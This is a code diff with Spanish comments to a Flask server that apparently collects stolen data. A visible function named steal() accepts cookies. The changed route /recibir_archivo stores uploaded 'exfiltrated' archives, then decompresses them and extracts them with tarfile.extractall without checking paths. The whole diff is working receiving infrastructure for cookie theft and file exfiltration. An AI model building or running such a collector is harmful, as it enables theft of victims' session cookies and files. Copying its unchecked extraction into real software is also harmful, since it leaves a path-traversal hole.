@@ -38,11 +38,50 @@ def steal():
         return "Cookie received", 200
     return "No cookie provided", 400
 
+import gzip
+import tarfile
+import os
+from flask import request
+
 @app.route('/recibir_archivo', methods=['POST'])
 def recibir_archivo():
-    with open('exfiltracion_recibida.tar.gz', 'wb') as f:
+    gz_path = 'exfiltracion_recibida.gz'
+    tar_path = 'exfiltracion_recibida.tar'
+    extract_dir = 'data'
+
+    # Guardar el archivo recibido
+    with open(gz_path, 'wb') as f:
         f.write(request.get_data())
+
     print("Archivo exfiltrado recibido.")
+
+    # Crear el directorio de extracción si no existe
+    if not os.path.exists(extract_dir):
+        os.makedirs(extract_dir)
+
+    # Paso 1: Descomprimir el archivo .gz a .tar
+    try:
+        with gzip.open(gz_path, 'rb') as gz_file:
+            with open(tar_path, 'wb') as tar_file:
+                tar_file.write(gz_file.read())
+        print("Archivo descomprimido de .gz a .tar")
+    except Exception as e:
+        print(f"Error al descomprimir el archivo .gz: {e}")
+        return "error", 500
+
+    # Paso 2: Extraer el archivo .tar
+    try:
+        with tarfile.open(tar_path, 'r') as tar:
+            tar.extractall(path=extract_dir)
+        print(f"Datos extraídos en el directorio '{extract_dir}'")
+    except Exception as e:
+        print(f"Error al extraer el archivo .tar: {e}")
+        return "error", 500
+
+    # Opcional: Eliminar los archivos temporales
+    os.remove(gz_path)
+    os.remove(tar_path)
+
     return "ok"
 
 if __name__ == '__main__':
